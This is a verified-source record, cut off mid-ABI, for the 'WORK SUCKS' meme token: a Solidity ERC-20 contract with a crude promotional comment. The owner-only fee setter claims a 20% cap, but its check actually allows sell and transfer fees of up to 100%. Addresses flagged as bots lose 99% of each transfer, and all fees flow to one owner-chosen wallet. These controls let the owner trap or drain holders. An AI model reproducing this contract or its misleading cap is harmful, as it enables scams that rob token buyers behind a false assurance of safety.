{"SourceCode": "/**  \r\n    Do you hate working 9-5? Would you rather be out eating and drinking with your friends, enjoying life, \r\n    or sitting home smoking some OG, watching a movie, while getting a blowjob? Me too, that's why we've brought you WORK SUCKS token.\r\n    Join us in the quest to live life like we were meant to, and tell your boss to SUCK IT !! \r\n\r\n\r\n\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28c0\u28e4\u28e4\u28f4\u28ee\u28ff\u28bf\u28ff\u283f\u28b7\u287f\u28fe\u28f6\u28e6\u28e4\u28c4\u28c0                  \r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28a0\u28fe\u2852\u280b\u2809\u2808\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2809\u2809\u2819\u28bf\u28bf\u28f7\u28e6\u28c4\r\n\u2800\u2800\u2800\u2800\u2880\u28f4\u2877\u280b\u2819\u283b\u28e6\u28c0\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u281b\u28ff\u28e6\u2840\r\n\u2800\u2800\u2800\u28a0\u28ff\u280b\u2800\u2800\u2800\u2800\u2808\u2819\u28b7\u28c4\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28c0\u2844\u2800\u2880\u2840\u2808\u28bf\u28fd\u2840\r\n\u2800\u2800\u28b0\u28ff\u2803\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2819\u28b7\u28c4\u2800\u2800\u28b0\u285f\u281b\u28b2\u2844\u2800\u28b9\u2847\u28e0\u281e\u2801\u2800\u28b8\u28ff\u2845\r\n\u2800\u28a0\u28ff\u280f\u2800\u2800\u2800\u2800\u28e0\u2800\u28b0\u2844\u2880\u28e4\u28b6\u28fd\u2873\u28c4\u28b8\u2847\u2800\u28f8\u2807\u2800\u28b8\u28ff\u28c5\u2800\u2800\u2800\u2808\u28ff\u2847\r\n\u2800\u28b8\u28ff\u2844\u28b8\u28c7\u2800\u2880\u28ff\u2804\u28b8\u2841\u28fc\u280b\u2800\u2809\u28b3\u2859\u28bb\u28df\u281b\u28bf\u28c6\u2800\u28b8\u284f\u2819\u283b\u28e6\u2800\u2880\u28ff\u2847\r\n\u2800\u2838\u28ff\u2840\u2800\u28bb\u2844\u28f8\u2839\u2847\u28fe\u2801\u28ff\u2800\u2800\u2800\u28b8\u28c7\u28b8\u284f\u28b7\u2840\u2839\u2846\u2838\u2807\u2800\u2800\u2819\u2802\u28b0\u28ff\u2807\r\n\u2800\u2810\u28ff\u2847\u2800\u2808\u2837\u280f\u2800\u283b\u2807\u2800\u2818\u2837\u2836\u2836\u283e\u2803\u28b8\u2847\u2800\u283b\u28f6\u28c4\u2800\u2800\u2800\u2800\u2800\u2880\u287e\u285f\r\n\u2800\u2800\u28b8\u28ff\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2801\u2800\u2800\u2818\u28b7\u28e4\u2840\u2800\u2800\u2800\u28fe\u287f\u2803\r\n\u2800\u2800\u2800\u2819\u28bf\u28e6\u28c0\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2811\u28bf\u28e6\u28c0\u28fc\u287f\u2801\r\n\u2800\u2800\u2800\u2800\u2800\u2808\u281b\u28ff\u28f7\u28e6\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28e4\u28d4\u28f6\u28ff\u283f\u2803\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u281b\u283b\u283f\u28d7\u28f6\u28f6\u28f6\u28f6\u28fe\u28ef\u28ff\u28ff\u283f\u283f\u281b\u2813\u281b\u2809\u2801\r\n\r\n\r\n\u2800\u28e4\u2800\u2800\u2800\u2800\u2880\u2840\u2800\u28a0\u2846\u2800\u2800\u28c0\u28c0\u2800\u2800\u2800\u28a0\u28e4\u28e4\u28e4\u28e4\u2844\u2800\u2800\u28c0\u2800\u2800\u2800\u2800\u28c4\r\n\u2800\u28b8\u28c7\u2800\u2800\u2800\u28b8\u2847\u2800\u28b8\u2847\u28b0\u28ff\u285f\u28bf\u28e7\u2840\u2800\u28b8\u2847\u2809\u2809\u281b\u28ff\u2806\u2800\u28ff\u2800\u2800\u2800\u28e0\u28ff\r\n\u2800\u2808\u28ff\u2800\u2800\u2880\u28ff\u28ff\u2800\u28fc\u2801\u28b8\u284f\u2800\u2808\u28ff\u2867\u2800\u28b8\u28c7\u28e4\u28f4\u2876\u280b\u2800\u2800\u28bf\u2844\u28e4\u28fe\u280f\u2801\r\n\u2800\u2800\u28bf\u2847\u2800\u28ff\u280b\u28ff\u28b0\u28ff\u2800\u28fc\u2807\u2800\u2800\u2818\u28ff\u2800\u28b8\u28ef\u2809\u2819\u28f7\u28c4\u2800\u2800\u28b8\u287f\u28ff\u28c5\r\n\u2800\u2800\u28b8\u28e7\u28b8\u285f\u2800\u28ff\u28f8\u284f\u2800\u28bf\u2844\u2800\u2800\u2880\u28ff\u2800\u28b8\u28ff\u2800\u2800\u2819\u28bf\u28e6\u2840\u28b8\u2847\u2808\u283b\u28f7\u28c4\r\n\u2800\u2800\u2818\u28bf\u28fe\u2803\u2800\u28bf\u285f\u2800\u2800\u2808\u283b\u283f\u283f\u281f\u280b\u2800\u2808\u283f\u2800\u2800\u2800\u2800\u283b\u2807\u2838\u2807\u2800\u2800\u2808\u283b\u2807\r\n\u2800\u2800\u2800\u2808\u2809\r\n\r\n\u2800\u2880\u28ff\u28f6\u28f6\u28e4\u28e6\u28c4\u2800\u2800\u2840\u2800\u2800\u2800\u28c0\u2800\u2800\u28c0\u28e4\u28e4\u28e4\u2800\u28e0\u2800\u2800\u28c0\u2840\u2800\u28c0\u28e4\u28e4\u28e4\u28e4\u2844\r\n\u2800\u28b8\u28ff\u2803\u2800\u2800\u2800\u2809\u2800\u28b8\u28ff\u2800\u2800\u2830\u28ff\u2800\u28b0\u285f\u2803\u2800\u2800\u2800\u28ff\u2800\u28a0\u287f\u2803\u28b8\u28ff\u2809\u2809\u2809\u2809\u283b\r\n\u2800\u2818\u28ff\u28c4\u28c0\u28c0\u28c0\u2840\u2800\u28b8\u28ff\u2800\u2800\u2818\u28ff\u2800\u28fe\u2807\u2800\u2800\u2800\u2800\u28bb\u28c6\u287f\u2801\u2800\u2838\u28e7\u2840\r\n\u2800\u2800\u2808\u2809\u2809\u2809\u2819\u28ff\u2846\u28b8\u28ff\u2800\u2800\u28f8\u284f\u2800\u28ff\u2800\u2800\u2800\u2800\u2800\u28b8\u28ff\u28c6\u2800\u2800\u2800\u2819\u283b\u2837\u2836\u2836\u28e6\u2840\r\n\u2800\u28a0\u28e4\u28c0\u28c0\u28c0\u28f0\u287f\u2801\u2818\u28bf\u28c4\u28e0\u28ff\u2801\u2800\u28bb\u28e7\u28c0\u2800\u2800\u2800\u28ba\u28c7\u2819\u28b7\u2844\u2800\u28a0\u28c4\u2800\u2800\u2800\u28f8\u2847\r\n\u2800\u2818\u281b\u281b\u281b\u281b\u280b\u2801\u2800\u2800\u2808\u2809\u2809\u2800\u2800\u2800\u2800\u2809\u281b\u281b\u281b\u2802\u2818\u283f\u2800\u2800\u2819\u2837\u2818\u283f\u2837\u2836\u283e\u280f\r\n\r\nWORK SUCKS (WORK SUCKS)\r\n\r\n*/\r\n\r\n/**\r\n$WORK SUCKS is a meme coin with no intrinsic value or expectation of financial return. There is no formal team or roadmap. \r\nThis token is completely useless and for entertainment purposes only, and remember WORK still SUCKS !!!!!!\r\n\r\nIf you'd like us to tell your boss that they work for you now, send 1 million tokens to the burn address\r\n0x000000000000000000000000000000000000dEaD\r\n\r\n/** Eye Dia developed by 0xReturn\r\n */\r\n\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.19;\r\n\r\n\r\nlibrary SafeMath {\r\n\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            uint256 c = a + b;\r\n            if (c < a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b > a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function getOwner() external view returns (address);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);}\r\n\r\nabstract contract Ownable {\r\n    address internal owner;\r\n    constructor(address _owner) {owner = _owner;}\r\n    modifier onlyOwner() {require(isOwner(msg.sender), \"!OWNER\"); _;}\r\n    function isOwner(address account) public view returns (bool) {return account == owner;}\r\n    function  renounceOwnership() public onlyOwner {\r\n        owner = address(0); \r\n        emit OwnershipTransferred(address(0));\r\n    }\r\n    event OwnershipTransferred(address owner);\r\n}\r\n\r\ninterface IFactory{\r\n        function createPair(address tokenA, address tokenB) external returns (address pair);\r\n        function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n}\r\n\r\ninterface IRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline) external;\r\n}\r\n\r\ncontract WorkSucks is IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    string private constant _name = 'WORK SUCKS';\r\n    string private constant _symbol = 'WORK SUCKS';\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private _totalSupply = 1000000000000 * (10 ** _decimals);\r\n    mapping (address => uint256) _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) public isFeeExempt;\r\n    mapping (address => bool) private isBot;\r\n    IRouter router;\r\n    address public pair;\r\n    bool private tradingAllowed = false;\r\n    bool private swapEnabled = true;\r\n    uint256 private swapTimes;\r\n    bool private swapping;\r\n    uint256 swapAmount = 1;\r\n    uint256 private swapThreshold = ( _totalSupply * 1000 ) / 100000;\r\n    uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;\r\n    modifier lockTheSwap {swapping = true; _; swapping = false;}\r\n    uint256 private liquidityFee = 0;\r\n    uint256 private marketingFee = 0;\r\n    uint256 private developmentFee = 1000;\r\n    uint256 private burnFee = 0;\r\n    uint256 private totalFee = 0;\r\n    uint256 private sellFee = 0;\r\n    uint256 private transferFee = 0;\r\n    uint256 private denominator = 10000;\r\n    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    address internal development_receiver = 0xCa462eC42CB9Ac1371692A0D7e5C4c074a0C1Af6; \r\n    address internal marketing_receiver = 0xCa462eC42CB9Ac1371692A0D7e5C4c074a0C1Af6;\r\n    address internal liquidity_receiver = 0xCa462eC42CB9Ac1371692A0D7e5C4c074a0C1Af6;\r\n    uint256 public _maxTxAmount = ( _totalSupply * 200 ) / 10000;\r\n    uint256 public _maxSellAmount = ( _totalSupply * 300 ) / 10000;\r\n    uint256 public _maxWalletToken = ( _totalSupply * 300 ) / 10000;\r\n\r\n    constructor() Ownable(msg.sender) {\r\n        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());\r\n        router = _router; pair = _pair;\r\n        isFeeExempt[address(this)] = true;\r\n        isFeeExempt[liquidity_receiver] = true;\r\n        isFeeExempt[marketing_receiver] = true;\r\n        isFeeExempt[development_receiver] = true;\r\n        isFeeExempt[msg.sender] = true;\r\n        _balances[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n\r\n    receive() external payable {}\r\n    function name() public pure returns (string memory) {return _name;}\r\n    function symbol() public pure returns (string memory) {return _symbol;}\r\n    function decimals() public pure returns (uint8) {return _decimals;}\r\n    function OpenTrading() external onlyOwner {tradingAllowed = true;}\r\n    function getOwner() external view override returns (address) { return owner; }\r\n    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}\r\n    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}\r\n    function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}\r\n    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}\r\n    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}\r\n\r\n    function shouldContractSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {\r\n        bool aboveMin = amount >= minTokenAmount;\r\n        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;\r\n        return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender] && recipient == pair && swapTimes >= swapAmount && aboveThreshold;\r\n    }\r\n\r\n    function setContractSwapB(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {\r\n        swapAmount = _swapAmount; swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000)); \r\n        minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));\r\n    }\r\n\r\n    function setTransactionRequireB(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {\r\n        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;\r\n        require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), \"totalFee and sellFee cannot be more than 20%\");\r\n    }\r\n\r\n    function setTransactionLimitB(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {\r\n        uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);\r\n        _maxTxAmount = newTx; _maxSellAmount = newTransfer; _maxWalletToken = newWallet;\r\n        uint256 limit = totalSupply().mul(5).div(1000);\r\n        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, \"Max TXs and Max Wallet cannot be less than .5%\");\r\n    }\r\n\r\n    function setInternalAddresses(address _marketing, address _liquidity, address _development) external onlyOwner {\r\n        marketing_receiver = _marketing; liquidity_receiver = _liquidity; development_receiver = _development;\r\n        isFeeExempt[_marketing] = true; isFeeExempt[_liquidity] = true; isFeeExempt[_development] = true;\r\n    }\r\n\r\n    function setBBot(address[] calldata addresses, bool _enabled) external onlyOwner {\r\n        for(uint i=0; i < addresses.length; i++){\r\n        isBot[addresses[i]] = _enabled; }\r\n    }\r\n\r\n    function manualSwap() external onlyOwner {\r\n        swapAndLiquify(swapThreshold);\r\n    }\r\n\r\n    function rescueERC20(address _address, uint256 percent) external onlyOwner {\r\n        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);\r\n        IERC20(_address).transfer(development_receiver, _amount);\r\n    }\r\n\r\n    function swapAndLiquify(uint256 tokens) private lockTheSwap {\r\n        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);\r\n        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);\r\n        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);\r\n        uint256 initialBalance = address(this).balance;\r\n        swapTokensForETH(toSwap);\r\n        uint256 deltaBalance = address(this).balance.sub(initialBalance);\r\n        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));\r\n        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);\r\n        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }\r\n        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);\r\n        if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);}\r\n        uint256 contractBalance = address(this).balance;\r\n        if(contractBalance > uint256(0)){payable(development_receiver).transfer(contractBalance);}\r\n    }\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {\r\n        _approve(address(this), address(router), tokenAmount);\r\n        router.addLiquidityETH{value: ETHAmount}(\r\n            address(this),\r\n            tokenAmount,\r\n            0,\r\n            0,\r\n            liquidity_receiver,\r\n            block.timestamp);\r\n    }\r\n\r\n    function swapTokensForETH(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = router.WETH();\r\n        _approve(address(this), address(router), tokenAmount);\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp);\r\n    }\r\n\r\n    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {\r\n        return !isFeeExempt[sender] && !isFeeExempt[recipient];\r\n    }\r\n\r\n    function getTotalFee(address sender, address recipient) internal view returns (uint256) {\r\n        if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}\r\n        if(recipient == pair){return sellFee;}\r\n        if(sender == pair){return totalFee;}\r\n        return transferFee;\r\n    }\r\n\r\n    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {\r\n        if(getTotalFee(sender, recipient) > 0){\r\n        uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));\r\n        _balances[address(this)] = _balances[address(this)].add(feeAmount);\r\n        emit Transfer(sender, address(this), feeAmount);\r\n        if(burnFee > uint256(0) && getTotalFee(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}\r\n        return amount.sub(feeAmount);} return amount;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) private {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount <= balanceOf(sender),\"You are trying to transfer more than your balance\");\r\n        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, \"tradingAllowed\");}\r\n        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(DEAD)){\r\n        require((_balances[recipient].add(amount)) <= _maxWalletToken, \"Exceeds maximum wallet amount.\");}\r\n        if(sender != pair){require(amount <= _maxSellAmount || isFeeExempt[sender] || isFeeExempt[recipient], \"TX Limit Exceeded\");}\r\n        require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], \"TX Limit Exceeded\"); \r\n        if(recipient == pair && !isFeeExempt[sender]){swapTimes += uint256(1);}\r\n        if(shouldContractSwap(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}\r\n        _balances[sender] = _balances[sender].sub(amount);\r\n        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;\r\n        _balances[recipient] = _balances[recipient].add(amountReceived);\r\n        emit Transfer(sender, recipient, amountReceived);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"OpenTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxSellAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isFeeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"}],\"name\":\"rescueERC20\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"}],\"name\":\"setBBot\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_swapAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_swapThreshold\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_minTokenAmount\",\"type\":\"uint256\"}],\"name\":\"setContractSwapB\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_marketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_liquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_development\",\"type\":\"address\"}],\"name\":\"setInternalAddresses\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_buy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_wallet\",\"type\":\"uint256\"}],\"name\":\"setTransactionLimitB\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_liquidity\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_marketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_burn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_development\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_total\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_trans\",\"type\":\"uint256\"}],\"name\":\"setTransactionRequireB\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"}],\"name\":\"setisExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"